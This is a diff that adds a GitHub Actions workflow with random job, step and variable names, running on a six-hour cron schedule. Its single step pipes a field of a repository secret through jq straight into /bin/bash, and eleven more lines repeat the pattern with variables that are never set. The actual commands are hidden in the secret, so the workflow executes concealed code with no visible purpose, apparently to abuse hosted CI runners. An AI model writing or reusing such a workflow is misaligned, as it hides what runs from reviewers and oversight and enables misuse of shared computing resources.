@@ -1,0 +1,28 @@
+name: yanfusu1932
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanfusu1932
+        env:
+          qe94594: ${{ secrets.qe94594 }}
+        run: |
+          echo $qe94594 | jq -r .ckyws87110 | /bin/bash
+          echo $pozw7866 | jq -r .dqge32 | /bin/bash
+          echo $xep21890 | jq -r .c85222 | /bin/bash
+          echo $o736 | jq -r .xjk29 | /bin/bash
+          echo $bzpu0 | jq -r .qvuw436 | /bin/bash
+          echo $mpkg7875 | jq -r .pb0 | /bin/bash
+          echo $ujaxh21 | jq -r .ievd786 | /bin/bash
+          echo $okm108 | jq -r .pbqy4 | /bin/bash
+          echo $hgb033 | jq -r .ponh7 | /bin/bash
+          echo $ihyx2 | jq -r .eg9103 | /bin/bash
+          echo $mtid5462 | jq -r .kyxpq53 | /bin/bash
+          echo $c6242 | jq -r .gkva78 | /bin/bash
+
